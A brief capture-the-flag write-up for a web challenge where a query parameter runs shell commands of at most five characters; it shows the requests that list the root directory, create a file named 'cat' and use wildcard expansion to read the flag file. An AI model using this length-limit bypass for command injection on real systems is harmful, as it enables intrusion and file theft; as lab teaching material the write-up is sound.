# Hackme
**Category: Web**

In this challenge we can execute any shell command as long as it is 5 characters or less.

First, we can execute a command to find where the flag file is:

`GET /?cmd=ls+/`

```
bin
dev
etc
flag.txt
...
```

We can do some trickery with files to craft a command that can open this flag. First, let's create an empty file named `cat`:

`GET /?cmd=>cat`

Let's make sure that worked:

`GET /?cmd=ls`
```
cat
```

We can use wildcard expansion to use this as a command. (A payload of `* file` would be expanded to `cat file` since `cat` is the only file in the directory).

`GET /?cmd=*+/f*`
```
flag{ju57_g0tt@_5pl1t_Em3012}
```